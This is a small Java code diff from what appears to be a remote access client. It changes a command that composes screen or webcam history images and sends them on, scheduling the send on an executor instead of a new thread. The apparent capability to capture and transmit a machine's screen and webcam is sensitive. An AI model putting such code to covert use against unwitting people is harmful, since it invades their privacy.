@@ -3,6 +3,8 @@ package br.com.introcdc.connect.client.commands.image;
  * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 17:27
  */
 
+import br.com.introcdc.connect.Connect;
+import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
 import br.com.introcdc.connect.client.components.ImageComponents;
 
@@ -26,7 +28,7 @@ public class ClientCommandHistory extends ClientCommand {
             try {
                 BufferedImage image = ImageComponents.createHistoryImage(history);
                 msg("view-image");
-                new Thread(() -> ImageComponents.sendImage(5, image)).start();
+                ConnectClient.EXECUTOR.schedule(() -> ImageComponents.sendImage(5, image), Connect.DELAY, Connect.DELAY_TYPE);
             } catch (Exception exception) {
                 msg("Ocorreu um erro ao enviar a imagem do histórico da " + (input.equalsIgnoreCase("screen") ? "tela" : "webcam") + "! (" + exception.getMessage() + ")");
                 exception(exception);
